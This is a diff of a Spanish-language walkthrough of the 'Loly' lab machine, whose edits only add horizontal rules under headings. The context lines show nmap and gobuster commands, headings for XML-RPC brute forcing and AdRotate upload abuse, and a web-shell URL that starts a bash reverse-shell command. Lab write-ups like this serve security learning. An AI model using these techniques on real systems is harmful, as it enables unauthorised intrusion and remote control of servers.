@@ -18,6 +18,7 @@ tags:
 ---
 
 # PortScan
+____
 
 ```
  # Nmap 7.93 scan initiated Thu Oct 26 12:15:10 2023 as: nmap -sCV -p80 -oN targeted 192.168.204.155
@@ -36,7 +37,7 @@ tags:
 ```
 
 # Sitio Web
-
+____
 
 ![](/assets/images/loly/Pasted image 20231026142343.png)
 
@@ -60,6 +61,7 @@ Indagando en el Wordpress, vemos un sólo post de único usuario
 Por lo que ya sabemos un usuario válido.
 
 # Enumeración WordPress
+_____
 
 ```
 gobuster dir -u http://192.168.204.155/wordpress/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash -x php,wp
@@ -90,6 +92,7 @@ y como vemos el método está activo.
 ```
 
 # Fuerza Bruta XMLRPC en bash.
+____
 
 Nos montamos este script en bash.
 ```
@@ -130,6 +133,7 @@ Una vez ejecutado, nos dará las credenciales válida del usuario "loly".
 
 
 # Abuso Plugin AdRotate.
+____
 
 Sí nos fijamos en el plugin AdRotate, podremos subir archivos en formatos .zip y automáticamente se descomprimirían.
 
@@ -152,6 +156,7 @@ http://loly.lc/wordpress/wp-content/banners/cmd.php?cmd=bash%20-c%20%22bash%20-i
 ```
 
 # Escalada de Privilegios.
+____
 
 ```
 uname -a
